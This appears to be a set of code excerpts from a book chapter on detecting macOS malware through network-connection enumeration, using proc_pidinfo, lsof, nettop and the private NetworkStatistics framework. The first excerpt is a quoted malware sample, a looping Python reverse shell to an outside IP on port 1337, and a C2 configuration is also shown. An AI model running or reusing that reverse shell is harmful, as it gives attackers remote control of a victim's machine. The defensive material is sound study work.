["```\n#!/bin/bash\nwhile :\ndo\n    python -c\n        'import socket,subprocess,os;\n        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);\n        s.connect((\"185.243.115.230\",1337));\n        os.dup2(s.fileno(),0);\n        os.dup2(s.fileno(),1);\n        os.dup2(s.fileno(),2);\n        p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n    sleep 5\ndone \n```", "```\n% **lsof -nP | grep 1337 | grep -i python**\nPython   ...   TCP   192.168.1.245:63353->185.243.115.230:1337 (ESTABLISHED) \n```", "```\nos.Getenv(..., NOTTY_PORT, 0xa,...);\nstrconv.ParseInt(...);\nfmt.Sprintf(..., 0.0.0.0,..., port,...);\nnet.Listen(\"tcp\", address);\nmain.handle_connection(...); \n```", "```\n{\n    ...\n    \"C2\": {\n        \"Network\": \"stcp\",\n        \"Address\": \"darwin.github.wiki:53\"\n    },\n    ...\n} \n```", "```\n#import <libproc.h>\n#import <sys/proc_info.h>\n\npid_t pid = <some process id>;\n\n❶ int size = proc_pidinfo(pid, PROC_PIDLISTFDS, 0, NULL, 0);\nstruct proc_fdinfo* fdInfo = (struct proc_fdinfo*)malloc(size);\n\n❷ proc_pidinfo(pid, PROC_PIDLISTFDS, 0, fdInfo, size);\n... \n```", "```\nstruct proc_fdinfo {\n    int32_t   proc_fd;\n    uint32_t  proc_fdtype;\n}; \n```", "```\nfor(int i = 0; i < (size/PROC_PIDLISTFD_SIZE); i++) {\n    if(PROX_FDTYPE_SOCKET != fdInfo[i].proc_fdtype) {\n        continue;\n    }\n} \n```", "```\nstruct socket_fdinfo socketInfo = {0};\n\nproc_pidfdinfo(pid, fdInfo[i].proc_fd,\nPROC_PIDFDSOCKETINFO, &socketInfo, PROC_PIDFDSOCKETINFO_SIZE); \n```", "```\nif((AF_INET != socketInfo.psi.soi_family) && (AF_INET6 != socketInfo.psi.soi_family))  {\n    continue;\n} \n```", "```\nNSMutableDictionary* details = [NSMutableDictionary dictionary];\ndetails[@\"family\"] = (AF_INET == socketInfo.psi.soi_family) ? @\"IPv4\" : @\"IPv6\"; \n```", "```\nif(SOCKINFO_IN == socketInfo.psi.soi_kind) {\n    struct in_sockinfo sockInfo_IN = socketInfo.psi.soi_proto.pri_in;\n    // Add code to extract information from the UDP socket.\n} else if(SOCKINFO_TCP == socketInfo.psi.soi_kind) {\n    struct tcp_sockinfo sockInfo_TCP = socketInfo.psi.soi_proto.pri_tcp;\n    // Add code to extract information from the TCP socket.\n} \n```", "```\n} else if(SOCKINFO_TCP == socketInfo.psi.soi_kind) {\n    struct tcp_sockinfo sockInfo_TCP = socketInfo.psi.soi_proto.pri_tcp;\n    details[@\"protocol\"] = @\"TCP\";\n\n    details[@\"localPort\"] =\n    [NSNumber numberWithUnsignedShort:ntohs(sockInfo_TCP.tcpsi_ini.insi_lport)]; ❶\n\n    details[@\"remotePort\"] =\n    [NSNumber numberWithUnsignedShort:ntohs(sockInfo_TCP.tcpsi_ini.insi_fport)]; ❷\n    ...\n} \n```", "```\n#import <arpa/inet.h>\n\nif(AF_INET == socketInfo.psi.soi_family) {\n    char source[INET_ADDRSTRLEN] = {0};\n    char destination[INET_ADDRSTRLEN] = {0};\n\n    inet_ntop(AF_INET,\n    &(sockInfo_TCP.tcpsi_ini.insi_laddr.ina_46.i46a_addr4), source, sizeof(source)); ❶\n\n    inet_ntop(AF_INET, &(sockInfo_TCP.tcpsi_ini.insi_faddr.ina_46.i46a_addr4),\n    destination, sizeof(destination)); ❷\n} \n```", "```\nif(AF_INET6 == socketInfo.psi.soi_family) {\n    char source[INET6_ADDRSTRLEN] = {0};\n    char destination[INET6_ADDRSTRLEN] = {0};\n\n    inet_ntop(AF_INET6,\n    &(sockInfo_IN.insi_laddr.ina_6), source, sizeof(source));\n\n    inet_ntop(AF_INET6,\n    &(sockInfo_IN.insi_faddr.ina_6), destination, sizeof(destination));\n\n} \n```", "```\n#define TSI_S_CLOSED            0       /* closed */\n#define TSI_S_LISTEN            1       /* listening for connection */\n#define TSI_S_SYN_SENT          2       /* active, have sent syn */\n#define TSI_S_SYN_RECEIVED      3       /* have sent and received syn */\n#define TSI_S_ESTABLISHED       4       /* established */\n... \n```", "```\nswitch(sockInfo_TCP.tcpsi_state) {\n    case TSI_S_CLOSED:\n        details[@\"state\"] = @\"CLOSED\";\n        break;\n\n    case TSI_S_LISTEN:\n        details[@\"state\"] = @\"LISTEN\";\n        break;\n\n    case TSI_S_ESTABLISHED:\n        details[@\"state\"] = @\"ESTABLISHED\";\n        break;\n    ...\n} \n```", "```\n#import <netdb.h>\n#import <sys/socket.h>\n\nNSString* hostForAddress(char* address) {\n    struct addrinfo* results = NULL;\n    char hostname[NI_MAXHOST] = {0};\n    NSString* resolvedName = nil;\n  ❶ if(0 == getaddrinfo(address, NULL, NULL, &results)) {\n      ❷ for(struct addrinfo* r = results; r != NULL; r = r->ai_next) {\n            if(0 == getnameinfo(r->ai_addr, r->ai_addrlen,\n              ❸ hostname, sizeof(hostname), NULL, 0, 0)) {\n                resolvedName = [NSString stringWithUTF8String:hostname];\n                break;\n            }\n        }\n    }\n    if(NULL != results) {\n        freeaddrinfo(results);\n    }\n\n    return resolvedName;\n} \n```", "```\n% **./enumerateNetworkConnections 96202**\nSocket details: {\n    family = \"IPv4\";\n    protocol = \"TCP\";\n    localPort = 63353;\n    localIP = \"192.168.1.245\";\n    remotePort = 1337;\n    remoteIP = \"185.243.115.230\";\n    resolved = \"pttr2.qrizi.com\";\n    state = \"ESTABLISHED\";\n} \n```", "```\n% **nettop**\n\nlaunchd.1\n    tcp6 *.49152<->*.*\n        Listen\n\ntimed.352\n    udp4 192.168.1.245:123<->usscz2-ntp-001.aaplimg.com:123\n\nWhatsApp Helper.1186\n    tcp6 2603:800c:2800:641::cc.54413<->whatsapp-cdn6-shv-01-lax3.fbcdn.net.443   Established\n\ncom.apple.WebKi.78285\ntcp6 2603:800c:2800:641::cc.54863<->lax17s49-in-x0a.1e100.net.443  Established\ntcp4 192.168.1.245:54810<->104.244.42.66:443   Established\ntcp4 192.168.1.245:54805<->104.244.42.129:443  Established\n\nSignal Helper (.8431\ntcp4 192.168.1.245:54874<->ac88393aca5853df7.awsglobalaccelerator.com:443    Established\ntcp4 192.168.1.245:54415<->ac88393aca5853df7.awsglobalaccelerator.com:443    Established \n```", "```\n% **otool -L /usr/bin/nettop**\n/usr/bin/nettop:\n  /System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation\n  /usr/lib/libncurses.dylib\n  **/System/Library/PrivateFrameworks/NetworkStatistics.framework/Versions/A/NetworkStatistics**\n  /usr/lib/libSystem.B.dylib \n```", "```\nNStatManagerRef NStatManagerCreate(\nconst struct __CFAllocator*, dispatch_queue_t, void (^)(void*, int)); \n```", "```\nextern CFStringRef kNStatSrcKeyPID;\n```", "```\n❶ dispatch_queue_t queue = dispatch_queue_create(\"queue\", NULL);\n\nNStatManagerRef manager = NStatManagerCreate(kCFAllocatorDefault, queue,\n❷ ^(NStatSourceRef source, int unknown) {\n    // Add code here to complete the implementation.\n}); \n```", "```\nvoid NStatSourceSetDescriptionBlock(NStatSourceRef arg, void (^)(NSMutableDictionary*));\n```", "```\nNStatManagerRef = NStatManagerCreate(kCFAllocatorDefault, queue,\n^(NStatSourceRef source, int unknown) {\n    NStatSourceSetDescriptionBlock(source, ^(NSMutableDictionary* description) {\n        printf(\"%s\\n\", description.description.UTF8String);\n    });\n}); \n```", "```\nNStatManagerAddAllTCP(manager);\nNStatManagerAddAllUDP(manager); \n```", "```\ndispatch_semaphore_t semaphore = dispatch_semaphore_create(0);\n\n❶ NStatManagerQueryAllSourcesDescriptions(manager, ^{\n  ❷ dispatch_semaphore_signal(semaphore);\n});\n\n❸ dispatch_semaphore_wait(semaphore, DISPATCH_TIME_FOREVER);\n❹ NStatManagerDestroy(manager); \n```", "```\n% **./enumerateNetworkStatistics**\n...\n{\n    TCPState = Established;\n    ...\n ifWiFi = 1;\n    interface = 12;\n    localAddress = {length = 16, bytes = 0x1002c7f9c0a801f50000000000000000};\n    processID = 96202;\n    processName = Python;\n    provider = TCP;\n    ...\n    remoteAddress = {length = 16, bytes = 0x10020539b9f373e60000000000000000};\n    ...\n} \n```", "```\nNSString* convertAddress(NSData* data) {\n    in_port_t port = 0;\n    char address[INET6_ADDRSTRLEN] = {0};\n\n    struct sockaddr_in* ipv4 = NULL;\n    struct sockaddr_in6* ipv6 = NULL;\n\n    if(AF_INET == ((struct sockaddr*)data.bytes)->sa_family) { ❶\n        ipv4 = (struct sockaddr_in*)data.bytes;\n        port = ntohs(ipv4->sin_port);\n        inet_ntop(AF_INET, (const void*)&ipv4->sin_addr, address, INET_ADDRSTRLEN);\n    } else if (AF_INET6 == ((struct sockaddr*)data.bytes)->sa_family) { ❷\n        ipv6 = (struct sockaddr_in6*)data.bytes;\n        port = ntohs(ipv6->sin6_port);\n        inet_ntop(AF_INET6, (const void*)&ipv6->sin6_addr, address, INET6_ADDRSTRLEN);\n    }\n\n    return [NSString stringWithFormat:@\"%s:%hu\", address, port];\n}\n...\n\nNStatManagerRef = NStatManagerCreate(kCFAllocatorDefault, queue,\n^(NStatSourceRef source, int unknown) {\n    NStatSourceSetDescriptionBlock(source, ^(NSMutableDictionary* description) {\n        NSData* source = description[(__bridge NSString*)kNStatSrcKeyLocal];\n        NSData* destination = description[(__bridge NSString*)kNStatSrcKeyRemote];\n\n        printf(\"%s\\n\", description.description.UTF8String);\n        printf(\"%s -> %s\\n\",\n        convertAddress(source).UTF8String, convertAddress(destination).UTF8String); ❸\n    });\n\n}); \n```", "```\n% **./enumerateNetworkStatistics**\n...\n{\n    TCPState = Established;\n    ...\n    ifWiFi = 1;\n    interface = 12;\n    **localAddress = 192.168.1.245:63353**\n    processID = 96202;\n    processName = Python;\n    provider = TCP;\n    ...\n    **remoteAddress = 185.243.115.230:1337**\n    ...\n} \n```", "```\nNStatSourceSetDescriptionBlock(source, ^(NSMutableDictionary* description) {\n    unsigned long bytesUp =\n    [description[(__bridge NSString *)kNStatSrcKeyTxBytes] unsignedLongValue];\n\n    unsigned long bytesDown =\n    [description[(__bridge NSString *)kNStatSrcKeyRxBytes] unsignedLongValue];\n    ...\n}); \n```"]